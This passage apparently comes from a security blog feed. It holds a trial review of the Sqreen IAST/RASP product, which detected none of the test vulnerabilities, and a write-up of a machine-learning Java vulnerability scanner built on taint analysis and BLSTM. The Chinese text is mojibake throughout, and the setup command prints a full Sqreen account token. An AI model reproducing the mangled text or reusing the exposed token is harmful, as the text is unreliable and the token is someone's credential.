WAF</h2><p>åº”ç”¨å†…WAFæ˜¯ç¬¬ä¸€é“é˜²çº¿ï¼Œå’Œå¤–éƒ¨é˜²ç«å¢™ä¸€æ ·ï¼Œä¸»è¦é€šè¿‡æ¨¡å¼åŒ¹é…æ¥æ£€æµ‹å’Œé˜»æ­¢æ¶æ„æµé‡ï¼Œä½†ä¸å¤–éƒ¨WAFä¸åŒçš„æ˜¯ï¼Œåº”ç”¨å†…WAFå¯ä»¥æ ¹æ®å½“å‰åº”ç”¨çš„æ•°æ®åº“ã€æ¡†æ¶å’Œç¼–ç¨‹è¯­è¨€åº”ç”¨ä¸åŒçš„è§„åˆ™ï¼Œæé«˜æ•ˆç‡ã€‚</p><p>å¦‚ä¸‹å›¾ï¼Œåœ¨æ–°å»ºä¸€ä¸ªè§„åˆ™æ—¶ï¼Œå¯ä»¥é€‰æ‹©åŒ¹é…æŠ¥æ–‡çš„å“ªäº›å­—æ®µï¼ˆå…¶å®æ„Ÿè§‰è·Ÿå¤–éƒ¨WAFä¸€æ ·ï¼‰</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604191023036.png" alt="image-20200604191023036"></p><p>æ¥ç€å¯ä»¥é€‰æ‹©å¯¹å­—æ®µçš„åŒ¹é…è§„åˆ™</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604191224862.png" alt="image-20200604191224862"></p><p>å…¶ä¸­hasSQLinjectionå’ŒhasXSSinjectionè¿™ä¸¤ä¸ªå®é™…ä¸Šæ˜¯é¢„å®šä¹‰çš„æ­£åˆ™ï¼Œç±»ä¼¼ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604192113549.png" alt="image-20200604192113549"></p><p>ä¸‹å›¾å¯ä»¥çœ‹å‡º<strong>In-App WAFä¸å¤–éƒ¨WAFçš„åŒºåˆ«</strong>ï¼Œå³ä¸æœ¬åº”ç”¨æ— å…³çš„å…¶ä»–æŠ€æœ¯è¢«Disabledï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604191940016.png" alt="image-20200604191940016"></p><h2 id="RASP-Runtime-Application-Self-Protection"><a href="#RASP-Runtime-Application-Self-Protection" class="headerlink" title="RASP(Runtime Application Self-Protection)"></a>RASP(Runtime Application Self-Protection)</h2><p>RASPæ˜¯å­˜åœ¨å¾ˆä¹…çš„æ¦‚å¿µäº†ï¼ˆç›®å‰è¿˜æ²¡æ·±å…¥å­¦ä¹ ï¼ŒåæœŸä¼šè¡¥ä¸ŠæŠ€æœ¯åŸç†ï¼‰ï¼Œè¿™é‡Œç³»ç»Ÿæ”¯æŒä»¥ä¸‹æ¼æ´çš„é˜²å¾¡ï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604171427705.png" alt="image-20200604171427705"></p><h2 id="In-App-WAF-v-s-RASP"><a href="#In-App-WAF-v-s-RASP" class="headerlink" title="In-App WAF v.s. RASP"></a>In-App WAF v.s. RASP</h2><p>ä»æŠ€æœ¯åŸç†ä¸Šå¯ä»¥çœ‹åˆ°ä¸¤è€…çš„åŒºåˆ«ï¼ŒIn-App WAFæœ¬è´¨è¿˜æ˜¯WAFï¼Œé€šè¿‡æ­£åˆ™è§„åˆ™åŒ¹é…æ‹¦æˆªæ¶æ„æµé‡ï¼Œè€ŒRASPåˆ™æ˜¯hookäº†å…³é”®apiï¼Œé€šè¿‡åŠ¨æ€æ±¡ç‚¹åˆ†æç­‰æ–¹å¼å®ç°é«˜ç²¾åº¦çš„é˜²å¾¡ã€‚</p><h1 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h1><ol><li><p>ç”³è¯·é€‚ç”¨åï¼Œç‚¹å‡»â€œConnect a new applicationâ€ï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604164240814.png" alt="image-20200604164240814"></p></li><li><p>è¿›å…¥éƒ¨ç½²å¼•å¯¼ç•Œé¢ï¼Œé€‰æ‹©è¯­è¨€å’Œé¡¹ç›®åç§°ï¼Œç‚¹å‡»â€œshow instructionsâ€åå¯ä»¥çœ‹åˆ°éƒ¨ç½²çš„java agentï¼š</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604164525671.png" alt="image-20200604164525671"></p><p>æŒ‰å³ä¾§æŒ‡ç¤ºæ“ä½œå³å¯ï¼ŒåŒæ—¶å¯ä»¥çœ‹åˆ°å¯¹äºjavaæ˜¯ä½¿ç”¨javaagentå®ç°çš„ï¼Œä¼°è®¡æ˜¯hookäº†ä¸€äº›å‡½æ•°ã€‚</p></li><li><p>å¯¹äºJavaé¡¹ç›®ï¼Œä¸‹è½½agentï¼Œå¹¶åŠ å‚æ•°é‡å¯åº”ç”¨ï¼ˆäº§å“ä¸Šçº¿æ—¶å¯ä»¥ç”¨SDKé›†æˆçš„æ–¹æ¡ˆï¼Œè¯¦æƒ…è§<a href="https://docs.sqreen.com/java/user-monitoring/" target="_blank" rel="noopener">https://docs.sqreen.com/java/user-monitoring/</a>ï¼‰ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://download.sqreen.com/java/sqreen.jar -o sqreen.jar</span><br><span class="line">java -javaagent:sqreen.jar -Dsqreen.token=env_org_dd05c0b8eb3317bbbc7857420ec86abe2ea5aa347ffc6c3efc8ef060 -Dsqreen.app_name=JavaDemo -jar java-sec-code-1.0.0.jar</span><br></pre></td></tr></table></figure></li></ol><pre><code>å¯ä»¥çœ‹åˆ°Webé¡µé¢æœ€ä¸‹é¢ï¼Œæœ‰åº”ç”¨ä¸Šçº¿äº†ï¼š![image-20200604170231764](iast-Sqreenåˆæ¢/image-20200604170231764.png)</code></pre><h1 id="è¯•ç”¨ç»“æœ"><a href="#è¯•ç”¨ç»“æœ" class="headerlink" title="è¯•ç”¨ç»“æœ"></a>è¯•ç”¨ç»“æœ</h1><p>Javaæ–¹é¢å°è¯•äº†ä¸€ä¸‹<a href="https://github.com/JoyChou93/java-sec-code" target="_blank" rel="noopener">JavaSecCode</a>ï¼Œåå°„å‹/å­˜å‚¨å‹XSSã€SQLiã€å‘½ä»¤æ³¨å…¥ã€XXEéƒ½æ²¡èƒ½æ£€æµ‹åˆ°ï¼Œä¼°è®¡æ˜¯WAFé‚£è¾¹ä¼°è®¡æ˜¯è§„åˆ™é—®é¢˜ï¼ŒRASPå› ä¸ºæ–‡æ¡£é‡Œæ²¡æœ‰ä»‹ç»å…·ä½“åŸç†ï¼Œä¸å¥½ç»™å‡ºè§£é‡Šã€‚</p><p>Nodejsæ–¹é¢åŸæœ¬æƒ³å°è¯•ç”¨<a href="https://github.com/Anemone95/NodeSecCode" target="_blank" rel="noopener">NodeSecCode</a>è¯•ä¸€ä¸‹çš„ï¼Œä½†æ˜¯æµ‹è¯•å‘ç°Sqreenå¹¶ä¸æ”¯æŒeggæ¡†æ¶ï¼Œåœ¨app.jsåŠ å…¥requireåä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">It seems that the following modules have been required before Sqreen:</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/debug/src/index.js</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/graceful-process/index.js</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/egg-logger/index.js</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/egg/index.js</span><br><span class="line">Sqreen may not be able to protect the whole application.</span><br><span class="line">If you think this is an error, please report it to Sqreen team.</span><br><span class="line">Read more on https://doc.sqreen.io/docs/nodejs-agent-installation</span><br></pre></td></tr></table></figure><p>äºæ˜¯æ‰‹å†™ä¸€ç®€å•çš„expressæœåŠ¡ï¼Œå«ä¸€ä¸ªåå°„xssä»£ç ï¼ŒSqreenAgentå¯ä»¥æˆåŠŸéƒ¨ç½²ï¼Œä½†æ˜¯ä»æ²¡æœ‰å‘ç°è¯¥æ¼æ´ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>Sqreen ä¸»è¦åˆ©ç”¨åŠ¨æ€æ’æ¡©æŠ€æœ¯å®ç°äº†IASTï¼Œä½†æ˜¯å®é™…æµ‹è¯•æ¥çœ‹æ•ˆæœå¹¶ä¸æ˜¯å¾ˆå¥½ï¼ˆä¸è®ºJavaè¿˜æ˜¯Nodejséƒ½æ²¡æœ‰å‘ç°æ¼æ´ï¼‰ï¼Œå®˜æ–¹æ¨èæ˜¯é…åˆ<a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">Nikto</a>è¿›è¡Œæ‰«æï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ¬äº§å“ç”±äºè§„åˆ™å’Œè®¾è®¡ç­‰åŸå› ï¼Œè¿˜æ˜¯éœ€è¦ç»“åˆä¼ ç»Ÿé»‘ç›’æ‰«æçš„çˆ¬è™«æˆ–Payloadæ‰èƒ½æœ‰æ•ˆæœã€‚</p><h1 id="ç›¸å…³èµ„æ–™"><a href="#ç›¸å…³èµ„æ–™" class="headerlink" title="ç›¸å…³èµ„æ–™"></a>ç›¸å…³èµ„æ–™</h1><ul><li><p>Sqreenå®˜æ–¹æ–‡æ¡£ï¼Œ<a href="https://docs.sqreen.com/" target="_blank" rel="noopener">https://docs.sqreen.com/</a></p></li><li><p>Sqreen GitHubï¼Œ<a href="https://github.com/sqreen" target="_blank" rel="noopener">https://github.com/sqreen</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> IAST </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IAST </tag>
            
            <tag> RASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¯•è®¾ï¼šåŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ</title>
      <link href="/whitebox-%E6%AF%95%E8%AE%BE%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84Java%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B3%BB%E7%BB%9F/"/>
      <url>/whitebox-%E6%AF%95%E8%AE%BE%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84Java%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p><strong>æœ¬æ–‡é¦–æ¬¡å‘è¡¨åœ¨<a href="https://www.toutiao.com/i6826913540683596300/" target="_blank" rel="noopener">æ…•æµ‹å¤´æ¡å…¬ä¼—å·</a>ï¼Œè¿™é‡Œåªä½œå½’æ¡£ç”¨</strong></p><h1 id="èƒŒæ™¯æ„ä¹‰"><a href="#èƒŒæ™¯æ„ä¹‰" class="headerlink" title="èƒŒæ™¯æ„ä¹‰"></a>èƒŒæ™¯æ„ä¹‰</h1><p>éšç€äººä»¬å¯¹è½¯ä»¶å®‰å…¨çš„ä¸æ–­é‡è§†ï¼Œé™æ€å®‰å…¨æ‰«æç³»ç»Ÿè¢«éƒ¨ç½²äºå¼€å‘æµç¨‹ã€‚ç›¸å¯¹äºå…¶ä»–ä¼ ç»Ÿåˆ†ææ–¹æ³•ï¼Œæ±¡ç‚¹åˆ†ææŠ€æœ¯ç”±äºå…·æœ‰è¾ƒé«˜çš„å¯è§£é‡Šæ€§å’Œå‡†ç¡®æ€§ï¼Œç›®å‰ä½œä¸ºæŒ–æ˜ Web æ¼æ´çš„å¸¸ç”¨æŠ€æœ¯ï¼Œå¹¿æ³›åº”ç”¨äºå¼€æºå’Œå•†ç”¨æ‰«æå™¨ä¸­ã€‚</p><p>ç„¶è€Œï¼Œæ±¡ç‚¹åˆ†ææ–¹æ³•å­˜åœ¨ç§ç§ä¸è¶³ã€‚é¦–å…ˆï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†å®¹å™¨ç±»å‹ï¼Œé™æ€æ±¡ç‚¹åˆ†æåªèƒ½å°†å®¹å™¨å˜é‡ï¼ˆå¦‚Mapã€Listå˜é‡ï¼‰çš„ä¼ æ’­è§„åˆ™è®¾ä¸ºä¼ æ’­/ä¸ä¼ æ’­æ±¡ç‚¹ï¼Œé€ æˆè¿‡æ±¡æŸ“/æ¬ æ±¡æŸ“ï¼›å…¶æ¬¡ï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†æ§åˆ¶æµï¼Œæ±¡ç‚¹åˆ†æå¹¶ä¸èƒ½è¯†åˆ«ç”¨äºæ£€æŸ¥æ•°æ®æ˜¯å¦åˆæ³•çš„åˆ†æ”¯è¯­å¥ï¼Œå¯¼è‡´è¯¯æŠ¥ï¼›æœ€åï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†ç‰¹æ®Šçš„ä¼ æ’­æ¡ä»¶ï¼Œå¦‚SSRFæ¼æ´è¦æ±‚æ”»å‡»è€…èƒ½æ“çºµåŸŸåï¼Œè‹¥æ±¡ç‚¹æ‹¼æ¥åœ¨URLå‚æ•°éƒ¨åˆ†ï¼Œåˆ™ä»£ç ä¸å­˜åœ¨æ¼æ´ï¼Œè€Œæ±¡ç‚¹åˆ†æä»ä¼šæŠ¥å‘Šæ¼æ´ã€‚ä¸ºè§£å†³è¿™äº›é—®é¢˜ï¼Œç›®å‰å®‰å…¨å·¥ç¨‹å¸ˆåªæœ‰æ‰‹åŠ¨è®¾è®¡ç²¾å·§çš„è§„åˆ™ï¼Œå¯å³ä½¿è¿™æ ·ä»ä¼šäº§ç”Ÿå¤§é‡è¯¯æŠ¥ç”šè‡³æ¼æŠ¥ã€‚</p><a id="more"></a><p>ä¸ºè§£å†³ä¼ ç»Ÿåˆ†ææ–¹æ³•é«˜è¯¯æŠ¥ã€éœ€è¦èŠ±å¤§é‡äººåŠ›å®šä¹‰è§„åˆ™ç­‰é—®é¢˜ï¼Œéšç€æœºå™¨å­¦ä¹ é¢†åŸŸçš„ä¸æ–­å‘å±•ï¼Œå­¦æœ¯ç•Œä¸€ç›´åœ¨æ¢ç´¢æœºå™¨å­¦ä¹ åœ¨é™æ€å®‰å…¨æ‰«æä¸Šçš„åº”ç”¨ã€‚æçç­‰å­¦è€…ä½¿ç”¨åå‘ç¨‹åºåˆ‡ç‰‡ç»“åˆBLSTMç¥ç»ç½‘ç»œè¿›è¡Œæ¼æ´æŒ–æ˜[1]ï¼Œç„¶è€Œä»–ä»¬çš„å·¥å…·åªèƒ½ç”¨äºC/C++ç¼–å†™çš„è½¯ä»¶ï¼ŒKoc ç­‰å­¦è€…æå‡ºä½¿ç”¨ç±»ä¼¼æŠ€æœ¯å¯¹Javaä»£ç æ¼æ´è¿›è¡Œè¿‡æ»¤[2,3]ï¼Œé€šè¿‡é¢„æµ‹è¯¯æŠ¥æé«˜æ‰«æç»“æœå‡†ç¡®æ€§ï¼Œå®éªŒè¯æ˜è¯¥å·¥å…·å…·æœ‰å¾ˆå¥½çš„æ•ˆæœï¼Œç„¶è€Œç”±äºä¼ ç»Ÿç¨‹åºåˆ‡ç‰‡è¿‡äºè€—æ—¶ï¼Œå…¶å·¥ä½œåªèƒ½å¯¹æ±¡ç‚¹ä¼ æ’­çš„æœ€åä¸€æ®µå‡½æ•°ä½“è¿›è¡Œåˆ‡ç‰‡ï¼Œæ±¡ç‚¹ä¼ æ’­æ˜¯å¦èƒ½å¤Ÿä¼ æ’­å¹¶ä¸ç­‰ä»·äºæ±¡ç‚¹æ˜¯å¦èƒ½å¤Ÿåœ¨æ±‡èšç‚¹ä¼ æ’­ï¼Œå› æ­¤ä»–ä»¬çš„å·¥ä½œæ— æ³•ç”¨äºå®é™…åœºæ™¯ã€‚</p><p>å¯è§ï¼Œä¸€æ¬¾å®é™…å¯ç”¨çš„åŸºäºæœºå™¨å­¦ä¹ çš„Javaé™æ€æ¼æ´æ‰«æç³»ç»Ÿèƒ½æœ‰æ•ˆå‡è½»å·¥ç¨‹å¸ˆå·¥ä½œé‡ï¼Œåœ¨å¿«é€Ÿå¼€å‘è½¯ä»¶çš„åŒæ—¶ä¿è¯è½¯ä»¶å®‰å…¨æ€§ã€‚</p><h1 id="ç³»ç»Ÿä»‹ç»"><a href="#ç³»ç»Ÿä»‹ç»" class="headerlink" title="ç³»ç»Ÿä»‹ç»"></a>ç³»ç»Ÿä»‹ç»</h1><p>æœ¬ç³»ç»Ÿç»“åˆæœ€æ–°å­¦æœ¯ç•Œæˆæœï¼Œé¢å‘ Web å¼€å‘å¸¸ç”¨çš„ Java è¯­è¨€ï¼Œåˆ©ç”¨æ±¡ç‚¹åˆ†æã€ç¨‹åºåˆ‡ç‰‡å’Œ BLSTM ä¸ºå¼€å‘æˆ–å®‰å…¨å·¥ç¨‹å¸ˆæä¾›æ›´å‡†ç¡®çš„ä»£ç æ‰«ææœåŠ¡ã€‚å…¶å·¥ä½œæµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¥ç¨‹å¸ˆåœ¨ç³»ç»Ÿä¸­æ–°å»ºæ‰«æé¡¹ç›®ï¼Œåœ¨é¡¹ç›®ä¸­æäº¤æºä»£ç å’ŒJaråŒ…ï¼›æ±¡ç‚¹åˆ†ææ¨¡å—å¯¹ Jar åŒ…è¿›è¡Œæ±¡ç‚¹åˆ†æï¼Œå¾—åˆ°æ±¡ç‚¹ä¼ æ’­æŠ¥å‘Šï¼Œæ±¡ç‚¹æŠ¥å‘Šä¸­åŒ…å«æœ‰æ¼æ´å®ä¾‹å’Œå¯¹åº”çš„æ±¡ç‚¹ä¼ æ’­æ ‘ï¼›ç¨‹åºåˆ‡ç‰‡æ¨¡å—å°†å¯¹ä¼ æ’­æ ‘åˆ†è§£ä¸ºæ±¡æŸ“æµï¼Œå¹¶å¯¹æ¯ä¸€æ±¡æŸ“æµè¿›è¡Œåˆ‡ç‰‡ï¼›æ•°æ®é¢„å¤„ç†æ¨¡å—å¯¹åˆ‡ç‰‡è¿›è¡Œæ³›åŒ–å’Œå‘é‡åŒ–å¤„ç†ï¼Œå¾—åˆ°åˆ‡ç‰‡çš„ç‰¹å¾å‘é‡ï¼›é¢„æµ‹æ¨¡å—é€šè¿‡BLSTMæ¨¡å‹å¯¹åˆ‡ç‰‡è¿›è¡Œé¢„æµ‹ï¼Œä»è€Œæ¨å¯¼æ¼æ´æ˜¯å¦ä¸ºè¯¯æŠ¥ï¼›è‡³æ­¤ï¼Œç³»ç»Ÿå°†æ›´ç²¾å‡†çš„æ¼æ´æŠ¥å‘Šè¿”å›è‡³ç”¨æˆ·ã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/overview169-1590658589087.png" alt="overview169"></p><p>åœ¨æ±¡ç‚¹ä¼ æ’­è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå¯¹FindSecBugsçš„æ±¡ç‚¹åˆ†æè¿‡ç¨‹è¿›è¡Œæ”¹é€ ï¼Œä½¿å…¶åœ¨æŠ¥å‘Šä¸­è¿”å›æ±¡ç‚¹ä¼ æ’­æ ‘ï¼Œæ±¡ç‚¹ä¼ æ’­æ ‘è¡¨ç¤ºæ±¡ç‚¹çš„å”¯ä¸€ä¼ æ’­è·¯å¾„ï¼Œä¸ºç¨‹åºåˆ‡ç‰‡æä¾›ä¾æ®ã€‚ä¾‹å¦‚ï¼Œå¯¹äºä»£ç  1 æ¥è¯´ï¼Œåœ¨æ±¡ç‚¹ä¼ æ’­æŠ¥å‘Šä¸­è¿”å›å¦‚å›¾ 1æ‰€ç¤ºçš„ä¼ æ’­æ ‘ï¼Œå¯è§ä¼ æ’­æ ‘çš„æ ‘æ ¹ä¸ºæ±¡ç‚¹å…¥å£å‡½æ•°ä¸Šä¸‹æ–‡ï¼Œå¶å­èŠ‚ç‚¹ä¸ºå‡½æ•°è°ƒç”¨æˆ–è¿”å›è¯­å¥ï¼Œä¸”å¶å­èŠ‚ç‚¹å­˜åœ¨é¡ºåºï¼Œä¸”ç»ˆæ­¢äºæ±‡èšç‚¹ï¼Œæ³¨æ„å°½ç®¡ä»£ç ä¸­å­˜åœ¨ifåˆ†æ”¯ï¼Œä½†æœ‰çš„åˆ†æ”¯è¿”å›è¯­å¥ä¸æ±¡ç‚¹æ— å…³ï¼Œå› æ­¤æœ€ç»ˆåªæœ‰ä¸€ä¸ªæ±¡ç‚¹ä¼ æ’­æ ‘ã€‚</p><p>åœ¨ç¨‹åºåˆ‡ç‰‡è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå¯¹æ±¡ç‚¹åˆ†ææŠ¥å‘Šä¸­çš„æ¼æ´å®ä¾‹è¿›è¡Œåˆ‡ç‰‡ï¼Œä¸ºè§£å†³åˆ‡ç‰‡è§„æ¨¡å·¨å¤§é€ æˆæ‰«ææ—¶é—´è¿‡é•¿ç”šè‡³æ‰«æå¤±è´¥çš„é—®é¢˜ï¼Œåœ¨åˆ‡ç‰‡å‰ï¼Œç³»ç»Ÿé€šè¿‡é™åˆ¶è°ƒç”¨å›¾èŠ‚ç‚¹ä¸ªæ•°ä¿è¯åˆ‡ç‰‡å¿«é€Ÿå®Œæˆï¼›åŒæ—¶ï¼Œä¸ºä¿è¯åˆ‡ç‰‡è¦†ç›–æ±¡ç‚¹ä¼ æ’­å…¨é˜¶æ®µï¼Œç³»ç»Ÿå¯¹ä¸€ä¸ªæ¼æ´è¿›è¡Œåˆ†æ®µåˆ‡ç‰‡ï¼Œå¯¹äºä¸€ä¸ªæ¼æ´çš„æ¯ä¸€ä¼ æ’­æ ‘ï¼Œå°†å…¶æ‹†è§£ä¸ºæ±¡ç‚¹ä¼ æ’­ç‰‡æ®µï¼Œç”±â€œå‡½æ•°æ‘˜è¦â†’å…´è¶£ç‚¹è¡Œå·â€äºŒå…ƒç»„è¡¨ç¤ºï¼Œå†å¯¹æ¯ä¸ªç‰‡æ®µè¿›è¡Œåˆ‡ç‰‡ï¼Œä¾‹å¦‚å›¾ 1 çš„æ±¡ç‚¹ä¼ æ’­æ ‘ï¼Œå°†ä¼šäº§ç”Ÿ<strong>doGet()â†’line:5</strong>ã€<strong>filter()â†’line:13</strong>å’Œ<strong>sink()â†’line:17</strong> 3ä¸ªåˆ‡ç‰‡ã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/ä»£ç 1å’Œå›¾1.png" alt="ä»£ç 1å’Œå›¾1"></p><p>åœ¨é¢„å¤„ç†è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå¯¹æ¯ä¸€åˆ‡ç‰‡è¿›è¡Œæ³›åŒ–å’Œå‘é‡åŒ–å¤„ç†ï¼Œå›¾ 4 å°†è¯´æ˜æ³›åŒ–è¿‡ç¨‹ï¼Œå›¾ä¸­å·¦ä¾§ä¸ºåŸå§‹åˆ‡ç‰‡è¾“å‡ºï¼Œå…¶æ¯è¡Œä»£è¡¨ä¸€ä¸ªSDGèŠ‚ç‚¹ï¼ŒSDGèŠ‚ç‚¹ç”±â€œåºå·ï¼šï¼šèŠ‚ç‚¹ç±»å‹ï¼šï¼šæŒ‡ä»¤ç±»å‹ï¼šï¼šè¿”å›å€¼ï¼šï¼šå…·ä½“å†…å®¹â€æ„æˆï¼Œé¢„å¤„ç†è¿‡ç¨‹ä¿ç•™èŠ‚ç‚¹ç±»å‹ã€æŒ‡ä»¤ç±»å‹å’Œå…·ä½“å†…å®¹ï¼Œå¹¶å¯¹åˆ‡ç‰‡ä¸­æ•°å­—å¸¸é‡ã€å­—ç¬¦ä¸²å¸¸é‡ã€å˜é‡ã€å‡½æ•°è°ƒç”¨å’Œç±»åæ–¹æ³•åè¿›è¡ŒæŠ½è±¡ï¼Œç»è¿‡æ³›åŒ–ååˆ‡ç‰‡å¦‚å³ä¾§æ‰€ç¤ºã€‚å‘é‡åŒ–è¿‡ç¨‹å°†æ³›åŒ–åçš„å•è¯åºåˆ—è½¬åŒ–ä¸ºæ•°å­—å‘é‡ï¼Œç”¨äºä¼ å…¥ç¥ç»ç½‘ç»œã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/image-20200528173120092.png" alt="image-20200528173120092"></p><p>åœ¨è¯¯æŠ¥é¢„æµ‹è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿé¦–å…ˆé€šè¿‡BLSTMç¥ç»ç½‘ç»œé¢„æµ‹æ¯ä¸€æ±¡ç‚¹ä¼ æ’­ç‰‡æ®µæ˜¯å¦å¯ä»¥ä¼ æ’­æ±¡ç‚¹ï¼Œå†é€šè¿‡æ±¡ç‚¹ä¼ æ’­è§„åˆ™æ¨å¯¼æ¼æ´æ˜¯å¦ä¸ºè¯¯æŠ¥ï¼Œå³ï¼šè‹¥ä¼ æ’­æ ‘ä¸­å›½ä»»æ„ä¸€ä¸ªé˜¶æ®µä¸èƒ½ä¼ æ’­æ±¡ç‚¹ï¼Œé‚£ä¹ˆè¯¥ä¼ æ’­æ ‘æ— æ³•åˆ©ç”¨ï¼›è‹¥æ¼æ´ä¸­æ‰€æœ‰ä¼ æ’­æ ‘æ— æ³•åˆ©ç”¨ï¼Œé‚£ä¹ˆæ ‡è®°è¯¥æ¼æ´ä¸ºè¯¯æŠ¥ã€‚ä¾‹å¦‚ä»£ç  1 ä¸­ï¼Œé¦–å…ˆBLSTMæ¨¡å‹å¾ˆå¯èƒ½é¢„æµ‹åˆ°<strong>filter()â†’line:13</strong> åˆ‡ç‰‡æ— æ³•ä¼ æ’­æ±¡ç‚¹ï¼Œå› æ­¤å¯¹åº”çš„æ±¡ç‚¹ä¼ æ’­æ ‘ä¸å¯åˆ©ç”¨ï¼Œåˆå› ä¸ºæ¼æ´åªæœ‰ä¸€ä¸ªä¼ æ’­æ ‘ï¼Œå› æ­¤ç³»ç»Ÿåˆ¤æ–­æ¼æ´ä¸ºè¯¯æŠ¥ã€‚</p><p>ä¸‹å›¾å±•ç¤ºäº†ç³»ç»Ÿä¸­ä»£ç  1çš„é¢„æµ‹ç»“æœï¼Œè¯¥å®ä¾‹çš„èŠ‚ç‚¹å·²ç»å˜ç°ï¼Œä¸”é¢„æµ‹æ˜¾ç¤ºä¸ºâ€œ[P:FP]â€ï¼ˆè¯¯æŠ¥ï¼‰ï¼Œå·¦ä¸‹æ–¹è¢«é¢„æµ‹ä¸ºæ¸…æ´å‡½æ•°å·²ç”±æ¸…æ´æ ‡è®°æ ‡æ³¨ï¼Œè¿™äº›æ ‡è®°å‘ç”¨æˆ·è§£é‡Šç³»ç»Ÿä¸ºä½•å°†å…¶é¢„æµ‹ä¸ºè¯¯æŠ¥ï¼Œè¿™è¯´æ˜æœ¬ç³»ç»Ÿæ˜¯çœŸå®æœ‰æ•ˆçš„ã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/å›¾3.png" alt="å›¾3"></p><p>å¯¹äºæ±¡ç‚¹ä¼ æ’­æŠ¥å‘Šï¼Œç”¨æˆ·å¯ä»¥æ ‡è®°ä¸ºæ­£æŠ¥æˆ–è¯¯æŠ¥ã€‚å¯¹äºæ­£æŠ¥ï¼Œç”¨æˆ·éœ€è‡³å°‘æŒ‡å®šä¸€ä¸ªå¯åˆ©ç”¨çš„æ±¡ç‚¹ä¼ æ’­æ ‘ï¼›å¯¹äºè¯¯æŠ¥ï¼Œç”¨æˆ·éœ€æŒ‡å®šè‹¥å¹²æ¡æ±¡ç‚¹æ— æ³•ä¼ æ’­çš„ç‰‡æ®µï¼Œç›´åˆ°ç³»ç»Ÿæ ¹æ®æ±¡ç‚¹ä¼ æ’­è§„åˆ™å°†å…¶æ¨å¯¼ä¸ºè¯¯æŠ¥ã€‚</p><h1 id="é¡¹ç›®æ•ˆç›Š"><a href="#é¡¹ç›®æ•ˆç›Š" class="headerlink" title="é¡¹ç›®æ•ˆç›Š"></a>é¡¹ç›®æ•ˆç›Š</h1><p>ä¸ºè¯æ˜ç³»ç»Ÿå‡†ç¡®æ€§ï¼Œæœ¬æ–‡å°†æœ¬ç³»ç»Ÿä¸ç›®å‰æµè¡Œçš„æ‰«æå·¥å…· FindSecBugs å¯¹æ¯”ï¼Œä»¥OWASP Benchmark v1.1ä¸­æ±¡ç‚¹ä¼ æ’­ç±»æ¼æ´ä½œä¸ºæ•°æ®é›†ï¼Œæ¯”è¾ƒä¸¤è€…çš„å‡†ç¡®ç‡ï¼ˆAccuracyï¼‰ã€ç²¾ç¡®ç‡ï¼ˆPrecisionï¼‰ã€å¬å›ç‡ï¼ˆRecallï¼‰å’Œ F1ã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/image-20200528173454324.png" alt="image-20200528173454324"></p><p>ç»“æœå¦‚å›¾ 4 æ‰€ç¤ºã€‚å¯ä»¥çœ‹å‡ºï¼Œä¸ºäº†ä¸å‘ç”Ÿæ¼æŠ¥ï¼ŒFind Security Bugs 